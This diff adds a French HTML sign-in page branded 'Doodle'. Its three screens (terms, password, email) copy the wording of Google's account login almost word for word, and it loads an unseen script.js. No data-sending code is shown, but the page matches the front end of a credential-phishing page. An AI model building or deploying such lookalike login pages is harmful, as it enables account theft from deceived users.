@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Doodle - Connexion</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <!-- Écran 1: Bienvenue -->
+        <div class="screen" id="screen1">
+            <div class="logo">Doodle</div>
+            <h1>Bienvenue</h1>
+            <div class="user-info">
+                <div class="user-icon">👤</div>
+                <p id="email1">utilisateur@doodle.com</p>
+            </div>
+            <div class="terms">
+                <p>Les <a href="#">Conditions d'utilisation de Doodle</a> vous indiquent à quoi vous attendre lorsque vous utilisez nos services. En cliquant sur "J'accepte", vous acceptez ces conditions.</p>
+                <p>Vous acceptez également les <a href="#">Conditions d'utilisation de Doodle Play</a> pour autoriser la détection d'applications et leur gestion.</p>
+                <p>Consultez les <a href="#">Règles de confidentialité</a> de Doodle pour savoir comment nous traitons les informations générées lorsque vous utilisez nos services. Vous pouvez à tout moment accéder à votre compte Doodle (account.doodle.com) pour procéder à un Check-up Confidentialité ou modifier les paramètres de confidentialité.</p>
+            </div>
+            <button class="btn" onclick="goToScreen(2)">J'accepte</button>
+        </div>
+
+        <!-- Écran 2: Mot de passe -->
+        <div class="screen" id="screen2" style="display: none;">
+            <div class="logo">Doodle</div>
+            <h1>Bienvenue</h1>
+            <div class="user-info">
+                <div class="user-icon">👤</div>
+                <p id="email2">utilisateur@doodle.com</p>
+            </div>
+            <div class="form-group">
+                <input type="password" id="password" placeholder="Saisissez votre mot de passe" class="input-field">
+            </div>
+            <div class="checkbox-group">
+                <input type="checkbox" id="showPassword" onchange="togglePassword()">
+                <label for="showPassword">Afficher le mot de passe</label>
+            </div>
+            <a href="#" class="forgot-link">Mot de passe oublié ?</a>
+            <button class="btn" onclick="goToScreen(3)">Suivant</button>
+        </div>
+
+        <!-- Écran 3: Connexion initiale -->
+        <div class="screen" id="screen3" style="display: none;">
+            <div class="logo">Doodle</div>
+            <h1>Connexion</h1>
+            <p class="info-text">Utilisez votre compte Doodle. Il sera ajouté à cet appareil et disponible pour d'autres applis Doodle.</p>
+            <a href="#" class="info-link">En savoir plus sur l'utilisation de votre compte</a>
+            <div class="form-group">
+                <input type="email" id="email" placeholder="Adresse e-mail ou téléphone" class="input-field">
+            </div>
+            <a href="#" class="forgot-link">Adresse e-mail oubliée ?</a>
+            <a href="#" class="create-link">Créer un compte</a>
+            <button class="btn" onclick="goToScreen(1)">Suivant</button>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
